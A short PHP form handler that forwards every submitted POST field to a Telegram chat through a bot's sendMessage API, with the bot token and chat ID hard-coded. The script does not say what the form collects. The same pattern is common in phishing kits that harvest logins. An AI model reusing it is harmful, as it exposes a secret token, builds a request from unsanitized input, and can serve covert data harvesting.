
<?php


$token = "6193184197:AAH1gvZZu9GRCxHrZCsGfIFMvJbgV2wcYv0";

$chat_id = "-1001921504353";

foreach ($_POST as $key => $value) {
  $txt .= "<b>" . $key . "</b> " . str_replace("#", "%23", $value) . "%0A";
};


$sendToTelegram = fopen("https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chat_id}&parse_mode=html&text={$txt}", "r");

?>



